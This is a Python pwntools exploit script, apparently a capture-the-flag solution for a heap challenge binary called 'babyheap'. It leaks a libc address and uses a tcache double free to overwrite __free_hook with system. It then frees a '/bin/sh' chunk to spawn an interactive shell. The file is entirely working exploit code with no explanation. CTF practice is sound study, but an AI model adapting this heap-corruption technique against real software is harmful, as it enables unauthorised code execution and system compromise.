from pwn import *


binpath = './babyheap'
context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']

elf = ELF(binpath)
libc = elf.libc


gdbscript = '''
pwn
b *(0x555555554000+0x9ad)
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = process(binpath)


def alloc(content):
    io.recvuntil('> ')
    io.sendline('1')

    io.recvuntil('Content: ')
    io.sendline(content)


def delete():
    io.recvuntil('> ')
    io.sendline('2')


def wipe():
    io.recvuntil('> ')
    io.sendline('3')


io.recvuntil('>>>>> ')
data = io.recvuntil(' ')
addr_stdin = int(data, 16)
addr_libc = addr_stdin - 0x3eba00
print hex(addr_libc)


alloc('hoge')
delete()
delete()

addr_free_hook = addr_libc + libc.symbols['__free_hook']
addr_system = addr_libc + libc.symbols['system']

wipe()
alloc(p64(addr_free_hook))
wipe()
alloc('consume')
wipe()
alloc(p64(addr_system))

wipe()
alloc('/bin/sh')
delete()


io.interactive()
